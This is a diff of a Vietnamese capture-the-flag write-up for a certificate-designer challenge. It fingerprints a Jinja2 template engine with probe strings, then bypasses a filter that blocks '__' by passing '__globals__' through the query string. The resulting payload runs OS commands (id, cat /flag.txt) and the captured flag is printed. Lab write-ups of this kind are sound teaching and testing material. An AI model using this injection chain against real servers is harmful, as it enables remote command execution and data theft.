@@ -4,58 +4,49 @@
 
 ## Đề bài
 
-Certmarq là nền tảng phát chứng chỉ khoá học: thiết kế mẫu một lần, merge thông tin từng học viên,
-rồi phát hành hàng loạt. Điểm mấu chốt của đề: trình design render chứng chỉ trên server của họ
-để issuer xem trước, và "nó tin người thiết kế hơi nhiều so với mức nên tin".
+Hệ thống mục tiêu là Certmarq, một nền tảng dịch vụ cấp phát chứng chỉ khóa học. Quy trình của nó: nhà phát hành chỉ việc thiết kế mẫu vỏn vẹn một lần, nền tảng sẽ tự động trích xuất và nhồi (merge) thông tin của từng học viên vào mẫu đó, rồi phun ra chứng chỉ hàng loạt. 
+Chỗ hiểm yếu của đề bài nằm ở tính năng: trình thiết kế (designer) cho phép nhà phát hành xem trước (preview) bản chứng chỉ bằng cách kết xuất (render) trực tiếp trên máy chủ. Lời nhận xét "nó quá dễ dãi tin tưởng vào người thiết kế hơn mức cho phép" chính là tiếng chuông báo tử cho máy chủ này.
 
 ## Phân tích ban đầu
 
-Đăng ký issuer không cần xác minh email, vào thẳng `/designer`. Trang có ghi rõ:
-*"every template runs through our content filter before it renders"* - tức đề biết có SSTI và đã đặt
-bộ lọc chặn.
+Người chơi có thể lách vào tạo tài khoản nhà phát hành (issuer) một cách nhẹ nhàng mà không bị hệ thống đòi hỏi xác thực email, đâm thẳng vào màn hình chức năng `/designer`. Trên giao diện, hệ thống cảnh cáo: 
+*"mọi bản mẫu (template) đều phải chui qua máy quét kiểm duyệt nội dung (content filter) trước khi được kết xuất"* - Đoạn này như một lời thách thức, nói huỵch toẹt ra là tác giả biết thừa lỗ hổng SSTI (Server-Side Template Injection) đang tồn tại và đã cắm bộ lọc để ngăn chặn nó.
 
-Sink là `POST /designer/preview` với duy nhất field `body`. Fingerprint engine:
+Điểm nhận chìm (sink) của dữ liệu nằm ở cổng `POST /designer/preview`, chỉ ngốn duy nhất một trường dữ liệu là `body`. Dùng các loại đạn thăm dò (fingerprint) bắn phá hệ thống để nhận diện động cơ:
 
-| Probe | Kết quả |
+| Đạn thăm dò (Probe) | Phản hồi |
 | --- | --- |
-| `{{7*7}}` | `49` |
-| `{{7*'7'}}` | `7777777` -> Jinja2 (Twig cho `77`) |
-| `${7*7}` | giữ nguyên -> không phải Twig/EJS |
-| `{{ ''\|class }}` | `TemplateAssertionError` -> cú pháp filter của Jinja |
-| `{{config.items()}}` | in toàn bộ Flask config |
-| `{{ ''.__class__ }}` | bị chặn: *the pattern "__" is not allowed* |
+| `{{7*7}}` | Đẻ ra `49` |
+| `{{7*'7'}}` | Đẻ ra `7777777` -> Đích thị là động cơ Jinja2 (Nếu là Twig thì nó sẽ nhả `77`). |
+| `${7*7}` | Giữ nguyên văn -> Loại trừ nhánh Twig/EJS. |
+| `{{ ''\|class }}` | Dội mã lỗi `TemplateAssertionError` -> 100% cú pháp bộ lọc của Jinja. |
+| `{{config.items()}}` | Phun sạch sẽ toàn bộ mảng cấu hình config của thư viện Flask. |
+| `{{ ''.__class__ }}` | Chặn đứng với thông báo: *the pattern "__" is not allowed* |
 
-Điểm đáng giá nhất: bộ lọc chỉ tìm một chuỗi duy nhất là `__`. Nó chặn mọi chuỗi literal chứa dunder
-trong template, nhưng không nhìn query string.
+Đánh giá tài sản thu hoạch được: Lỗ hổng chết người của cái bộ lọc ngớ ngẩn này là nó chỉ săm soi chăm chăm vào duy nhất một chuỗi văn bản là `__` (hai dấu gạch dưới - dunder). Mọi chuỗi rác (literal) chứa cụm dunder nhét trong template đều bị chém đứt, nhưng mắt nó lại hoàn toàn mù loà, không hề nhìn vào phần biến số truyền tải qua đuôi url (query string).
 
 ## Chuỗi khai thác
 
-Ý tưởng: giữ cho template không chứa `__` nào, còn tên dunder thật thì đưa vào từ bên ngoài qua
-`request.args`:
+Ý đồ tác chiến: Thiết kế một khối template trong sạch tì vết, cấm tuyệt đối mọi dấu vết của cụm `__`. Bù lại, cái tên thật sự của cụm dunder cần tìm sẽ được ta phù phép, nhập lậu từ bên ngoài thông qua ngõ cửa sau là biến `request.args`:
 
 ```jinja
 {{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
 ```
 
-- `lipsum` là global có sẵn trong Jinja2; `attr(request.args.g)` với `g=__globals__` lấy dict toàn cục
-  của module `jinja2.utils`, trong đó có `os` đã được import.
-- `['os'].popen(request.args.c).read()` chạy lệnh và trả output vào trang preview.
-- Body gửi đi không hề chứa `__`, nên qua được filter; `__globals__` nằm ở query string, nơi filter
-  không chạm tới.
+Giải phẫu cú pháp:
+- Biến `lipsum` là một khối dữ liệu toàn cục (global) được nhúng sẵn mặc định bên trong lòng Jinja2. Bằng cách gọi `attr(request.args.g)` kèm mồi `g=__globals__` vứt trên thanh query, ta đã thành công thò tay bốc trọn bộ từ điển biến toàn cục của module hệ thống `jinja2.utils`. Và trong mớ hỗn độn đó, bộ thư viện quyền lực `os` vốn đã được nạp (import) sẵn để đợi ta xài.
+- Dòng lệnh `['os'].popen(request.args.c).read()` có chức năng mượn danh nghĩa OS để kích nổ luồng lệnh hệ thống (thông qua biến `c`), và hốt trọn toàn bộ kết quả ném thẳng lên màn hình giao diện xem trước (preview).
+- Khối thân (body) của mã template đem gửi không hề tàng trữ cụm mã cấm `__`, giúp nó qua mặt bộ lọc kiểm duyệt một cách kiêu hãnh. Cụm từ nhạy cảm `__globals__` được nhét an toàn ở thanh URL (query string), nằm ngoài tầm quét radar của bộ lọc.
 
-Kiểm chứng bằng `c=id`: `uid=33(www-data)`. Sau đó `c=cat /flag.txt` cho cờ. Đọc thêm
-`/entrypoint.sh` thì đề tự xác nhận: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain
-reads /flag.txt"*.
+Bài kiểm tra nhân phẩm bằng lệnh `c=id`: Trả về `uid=33(www-data)`. Sau khi đã êm xuôi, thay đạn `c=cat /flag.txt` để cuỗm cờ. 
+Nếu mổ xẻ file `/entrypoint.sh` đính kèm, chính miệng tác giả cũng đã thừa nhận: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain reads /flag.txt"* (Lỗ hổng SSTI trực diện không bọc cát... một chuỗi RCE mẫu mực của Jinja2 đã moi được file /flag.txt).
 
-Payload đầy đủ kèm cách gọi bằng `fetch()` nằm trong `analysis/payload.md`.
+Khối payload thần thánh trọn vẹn và cách bọc nó bằng mã Javascript `fetch()` được cất giữ kỹ trong tệp `analysis/payload.md`.
 
 ## Flag
-```
+```text
 WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}
 ```
 
-Bài này không có `exploit.py` tái chạy được. Script `requests` đã viết nhưng chưa một
-lần chạy thành công: khi thử lại thì instance đã bị stop (WebVerse chỉ chạy một
-instance cùng lúc), và tên field thật của form đăng ký cũng chưa kịp xác nhận. Thứ
-được kiểm chứng là chuỗi payload kèm snippet JS trong `analysis/payload.md`, chạy
-ngay trên tab của chính instance.
+Lời dặn dò: Bạn không thể tìm thấy file `exploit.py` nào để chạy lại thao tác này. Đoạn mã script dùng thư viện `requests` từng được cày cuốc viết ra, nhưng đáng tiếc chưa từng trải qua một lần kích hoạt thành công: Khi người thử nghiệm chạy lại, môi trường (instance) đã bị máy chủ dập tắt (Nền tảng WebVerse có luật thép chỉ cho chạy duy nhất một môi trường tại một thời điểm), và định danh gốc của các trường thông tin trong form đăng ký vẫn chưa kịp được ghi chép xác nhận. 
+Sản phẩm cuối cùng được bảo chứng chính là đoạn chuỗi payload kèm theo khối mã nhúng JS nằm trong tệp `analysis/payload.md`. Mã này được thiết kế để nã trực tiếp trên giao diện console của cái tab chứa chính instance đó.
